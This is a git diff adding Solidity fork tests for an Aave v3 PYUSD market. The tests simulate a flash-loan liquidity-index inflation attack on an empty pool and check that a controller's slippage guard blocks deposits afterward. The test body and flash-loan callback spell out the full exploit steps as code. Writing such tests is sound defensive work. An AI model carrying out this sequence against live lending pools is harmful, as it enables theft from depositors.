@@ -1,7 +1,10 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
 pragma solidity >=0.8.0;
 
-import { IAToken } from "aave-v3-origin/src/core/contracts/interfaces/IAToken.sol";
+import { IAToken }            from "aave-v3-origin/src/core/contracts/interfaces/IAToken.sol";
+import { IPool as IAavePool } from "aave-v3-origin/src/core/contracts/interfaces/IPool.sol";
+import { DataTypes }          from "aave-v3-origin/src/core/contracts/protocol/libraries/types/DataTypes.sol";
+import { IPoolConfigurator }  from "aave-v3-origin/src/core/contracts/interfaces/IPoolConfigurator.sol";
 
 import "./ForkTestBase.t.sol";
 
@@ -468,6 +471,153 @@ contract AaveV3MainMarketWithdrawSuccessTests is AaveV3MainMarketBaseTest {
         assertEq(ausdc.balanceOf(address(almProxy)), 0);
         assertEq(usdc.balanceOf(address(almProxy)),  aTokenBalance);
         assertEq(usdc.balanceOf(address(ausdc)),     startingAUSDCBalance + 1_000_000e6 - aTokenBalance);
+    }
+
+}
+
+contract AaveV3MainMarketAttackBaseTest is ForkTestBase {
+
+    IAToken apyusd = IAToken(Ethereum.PYUSD_SPTOKEN);
+    IERC20  pyusd  = IERC20(0x6c3ea9036406852006290770BEdFcAbA0e23A0e8);
+
+    function setUp() public override {
+        super.setUp();
+
+        vm.startPrank(Ethereum.SPARK_PROXY);
+
+        rateLimits.setRateLimitData(
+            RateLimitHelpers.makeAddressKey(
+                mainnetController.LIMIT_AAVE_DEPOSIT(),
+                Ethereum.PYUSD_SPTOKEN
+            ),
+            25_000_000e6,
+            uint256(5_000_000e6) / 1 days
+        );
+        
+        rateLimits.setRateLimitData(
+            RateLimitHelpers.makeAddressKey(
+                mainnetController.LIMIT_AAVE_WITHDRAW(),
+                Ethereum.PYUSD_SPTOKEN
+            ),
+            10_000_000e6,
+            uint256(5_000_000e6) / 1 days
+        );
+        
+        mainnetController.setMaxSlippage(Ethereum.PYUSD_SPTOKEN, 1e18 - 1e4);  // Rounding slippage
+
+        // Empty the PYUSD pool.
+        IAavePool(Ethereum.POOL).withdraw(address(pyusd), apyusd.balanceOf(Ethereum.SPARK_PROXY), Ethereum.SPARK_PROXY);
+
+        // Set premium for flash loans to 0.09%
+        IPoolConfigurator(Ethereum.POOL_CONFIGURATOR).updateFlashloanPremiumTotal(9);
+
+        vm.stopPrank();
+    }
+
+    function _getBlock() internal pure override returns (uint256) {
+        return 23118264;
+    }
+
+}
+
+contract AaveV3MainMarketLiquidityIndexInflationAttackTest is AaveV3MainMarketAttackBaseTest {
+
+    function test_depositAave_liquidityIndexInflationAttack_pyusd() public {
+        // Step 1: Initial setup - Start with empty pool
+        // The pool should have minimal liquidity from fork state
+        assertEq(apyusd.totalSupply(),             0);
+        assertEq(pyusd.balanceOf(address(apyusd)), 0);
+
+        // Get initial liquidity index (should be 1 RAY = 1e27)
+        DataTypes.ReserveDataLegacy memory reserveData = IAavePool(Ethereum.POOL).getReserveData(address(pyusd));
+        uint256 initialLiquidityIndex = uint256(reserveData.liquidityIndex);
+        assertEq(initialLiquidityIndex, 1e27);
+
+        // Step 2: Attacker deposits funds into empty pool
+        uint256 flashLoanAmount = 1_000_000e6;
+        deal(address(pyusd), address(this), flashLoanAmount);
+        pyusd.approve(Ethereum.POOL, flashLoanAmount);
+
+        // Deposit to get aTokens and establish exchange rate
+        IAavePool(Ethereum.POOL).supply(address(pyusd), flashLoanAmount, address(this), 0);
+
+        // Step 3: Attacker takes second flash loan for entire deposited amount
+        // This will empty the aToken balance but keep totalSupply and liquidityIndex unchanged
+        address[] memory assets = new address[](1);
+        assets[0] = address(pyusd);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = flashLoanAmount;
+
+        uint256[] memory interestRateModes = new uint256[](1);
+        interestRateModes[0] = 0;
+
+        // Flash loan callback will handle the attack
+        IAavePool(Ethereum.POOL).flashLoan(
+            address(this),
+            assets,
+            amounts,
+            interestRateModes,
+            address(this),
+            "",
+            0
+        );
+
+        // Step 4: Verify the attack results
+        // Check that liquidity index has been inflated
+        DataTypes.ReserveDataLegacy memory finalReserveData = IAavePool(Ethereum.POOL).getReserveData(address(pyusd));
+        uint256 finalLiquidityIndex = uint256(finalReserveData.liquidityIndex);
+
+        // The liquidity index should be much higher than 1 RAY due to the attack
+        assertGt(finalLiquidityIndex, initialLiquidityIndex);
+
+        // Verify that deposit would fail due to slippage
+        deal(address(pyusd), address(almProxy), 100_000e6);
+
+        vm.prank(relayer);
+        vm.expectRevert("MainnetController/slippage-too-high");
+        mainnetController.depositAave(Ethereum.PYUSD_SPTOKEN, 100_000e6);
+    }
+
+    // Flash loan callback function
+    function executeOperation(
+        address[] calldata,
+        uint256[] calldata amounts,
+        uint256[] calldata,
+        address,
+        bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == Ethereum.POOL, "Only pool can call this");
+
+        uint256 flashLoanAmount = amounts[0];
+
+        // Step 4: Transfer underlying tokens directly to aToken balance
+        // This bypasses the deposit function, so no new aTokens are minted
+        pyusd.transfer(address(apyusd), flashLoanAmount);
+
+        // Step 5: Withdraw all but 1 aToken
+        // This makes totalSupply = 1 while liquidityIndex remains unchanged
+        uint256 aTokenBalance  = apyusd.balanceOf(address(this));
+        uint256 withdrawAmount = aTokenBalance - 1; // Leave 1 aToken
+
+        if (withdrawAmount > 0) {
+            IAavePool(Ethereum.POOL).withdraw(address(pyusd), withdrawAmount, address(this));
+        }
+
+        // Verify we have exactly 1 aToken left
+        assertEq(apyusd.balanceOf(address(this)), 1);
+
+        // Step 6: Repay the flash loan with premium
+        // Since totalSupply = 1, all the premium goes to the single share
+        // This drastically increases liquidityIndex
+        uint256 premium          = (flashLoanAmount * 9) / 10000; // 0.09% premium
+        uint256 totalRepayAmount = flashLoanAmount + premium;
+
+        // We need to have enough PYUSD to repay
+        deal(address(pyusd), address(this), totalRepayAmount);
+        pyusd.approve(Ethereum.POOL, totalRepayAmount);
+
+        return true;
     }
 
 }
